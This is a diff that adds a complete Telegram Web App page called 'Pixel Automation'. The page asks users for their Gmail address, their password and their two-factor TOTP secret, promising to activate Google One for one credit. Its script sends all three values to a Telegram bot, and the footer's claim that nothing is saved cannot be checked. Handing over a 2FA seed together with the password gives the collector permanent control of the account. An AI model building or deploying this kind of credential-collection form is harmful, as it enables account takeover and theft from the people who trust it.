@@ -1,1 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Pixel Automation</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  :root {
+    --bg: #1a1f2e;
+    --card-bg: #232838;
+    --border: #2e3548;
+    --accent: #4ade80;
+    --accent-dark: #22c55e;
+    --text: #e2e8f0;
+    --text-muted: #94a3b8;
+    --input-bg: #1e2332;
+    --error: #f87171;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    padding: 0;
+  }
+  .header {
+    background: linear-gradient(135deg, #2d6a4f 0%, #40916c 100%);
+    padding: 24px 20px;
+    position: relative;
+  }
+  .header .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(0,0,0,0.3);
+    border-radius: 20px;
+    padding: 6px 14px;
+    font-size: 13px;
+    margin-bottom: 12px;
+  }
+  .header .badge::before {
+    content: '';
+    width: 8px;
+    height: 8px;
+    background: var(--accent);
+    border-radius: 50%;
+  }
+  .header h1 {
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+  .header p {
+    font-size: 14px;
+    opacity: 0.85;
+  }
+  .header .cost {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(0,0,0,0.3);
+    border-radius: 20px;
+    padding: 8px 16px;
+    font-size: 14px;
+    margin-top: 14px;
+  }
+  .card {
+    background: var(--card-bg);
+    border-radius: 16px;
+    margin: 16px;
+    padding: 24px 20px;
+    border: 1px solid var(--border);
+  }
+  .section-title {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    color: var(--text-muted);
+    margin-bottom: 20px;
+    text-transform: uppercase;
+  }
+  .section-title .icon {
+    color: var(--accent);
+    font-size: 18px;
+  }
+  .field { margin-bottom: 20px; }
+  .field:last-child { margin-bottom: 0; }
+  .field label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: var(--text);
+  }
+  .input-wrap {
+    position: relative;
+  }
+  .field input {
+    width: 100%;
+    background: var(--input-bg);
+    border: 1.5px solid var(--border);
+    border-radius: 10px;
+    padding: 14px 16px;
+    font-size: 15px;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .field input:focus {
+    border-color: var(--accent);
+  }
+  .field input::placeholder {
+    color: var(--text-muted);
+    opacity: 0.6;
+  }
+  .toggle-pwd {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: var(--text-muted);
+    cursor: pointer;
+    font-size: 18px;
+    padding: 4px;
+  }
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 20px 0;
+  }
+  .hint {
+    font-size: 12px;
+    color: var(--text-muted);
+    margin-top: 8px;
+    display: flex;
+    gap: 6px;
+    align-items: flex-start;
+  }
+  .hint .info-icon {
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+  .btn-submit {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: calc(100% - 32px);
+    margin: 0 16px 12px;
+    padding: 16px;
+    background: linear-gradient(135deg, var(--accent) 0%, var(--accent-dark) 100%);
+    color: #1a1f2e;
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: opacity 0.2s, transform 0.1s;
+  }
+  .btn-submit:active {
+    transform: scale(0.98);
+    opacity: 0.9;
+  }
+  .btn-submit:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    transform: none;
+  }
+  .btn-submit .bolt { font-size: 20px; }
+  .disclaimer {
+    text-align: center;
+    font-size: 12px;
+    color: var(--text-muted);
+    padding: 0 16px 24px;
+    opacity: 0.7;
+  }
+  .error-msg {
+    color: var(--error);
+    font-size: 13px;
+    margin-top: 6px;
+    display: none;
+  }
+  .field.has-error input {
+    border-color: var(--error);
+  }
+  .field.has-error .error-msg {
+    display: block;
+  }
+</style>
+</head>
+<body>
 
+<div class="header">
+  <div class="badge">Google One Automation</div>
+  <h1>Pixel Automation</h1>
+  <p>Fill in Google information to activate Google One</p>
+  <div class="cost">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+    <span id="costLabel">1 credit</span>
+  </div>
+</div>
+
+<div class="card">
+  <div class="section-title">
+    <span class="icon">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+    </span>
+    GOOGLE ACCOUNT
+  </div>
+
+  <div class="field" id="emailField">
+    <label>Gmail address</label>
+    <input type="email" id="email" placeholder="example@gmail.com" autocomplete="email" inputmode="email">
+    <div class="error-msg">Please enter a valid Gmail address</div>
+  </div>
+
+  <div class="field" id="pwdField">
+    <label>Gmail password</label>
+    <div class="input-wrap">
+      <input type="password" id="password" placeholder="Enter your Gmail password" autocomplete="current-password">
+      <button class="toggle-pwd" type="button" onclick="togglePwd()">
+        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+      </button>
+    </div>
+    <div class="error-msg">Password is required</div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="section-title">
+    <span class="icon">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+    </span>
+    TWO-FACTOR AUTHENTICATION
+  </div>
+
+  <div class="field">
+    <label>2FA Secret (TOTP)</label>
+    <input type="text" id="totp" placeholder="For example: JBSWY3DPEHPK3PXP" autocomplete="off" style="text-transform: uppercase;">
+    <div class="hint">
+      <span class="info-icon">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+      </span>
+      <span>Secret key from Google Authenticator: exactly 32 Base32 characters (letters A-Z and numbers 2-7).</span>
+    </div>
+  </div>
+</div>
+
+<button class="btn-submit" id="submitBtn" onclick="submitForm()">
+  <span class="bolt">&#9889;</span>
+  Confirm and activate
+</button>
+
+<p class="disclaimer">The information is only used for this activation and is not saved.</p>
+
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+
+  // Apply Telegram theme if available
+  if (tg.themeParams.bg_color) {
+    document.documentElement.style.setProperty('--bg', tg.themeParams.bg_color);
+  }
+
+  function togglePwd() {
+    const inp = document.getElementById('password');
+    inp.type = inp.type === 'password' ? 'text' : 'password';
+  }
+
+  function validateEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  }
+
+  function submitForm() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const totp = document.getElementById('totp').value.trim().toUpperCase();
+
+    // Validate
+    let valid = true;
+    const emailField = document.getElementById('emailField');
+    const pwdField = document.getElementById('pwdField');
+
+    emailField.classList.remove('has-error');
+    pwdField.classList.remove('has-error');
+
+    if (!validateEmail(email)) {
+      emailField.classList.add('has-error');
+      valid = false;
+    }
+    if (!password) {
+      pwdField.classList.add('has-error');
+      valid = false;
+    }
+    if (!valid) return;
+
+    // Disable button
+    const btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="bolt">&#9889;</span> Processing...';
+
+    // Send data to bot
+    const data = JSON.stringify({
+      action: 'pixel_activate',
+      email: email,
+      password: password,
+      totp: totp || ''
+    });
+
+    tg.sendData(data);
+  }
+
+  // Enable MainButton as alternative
+  tg.MainButton.setParams({
+    text: 'Confirm and activate',
+    color: '#4ade80',
+    text_color: '#1a1f2e',
+    is_visible: false
+  });
+</script>
+
+</body>
+</html>
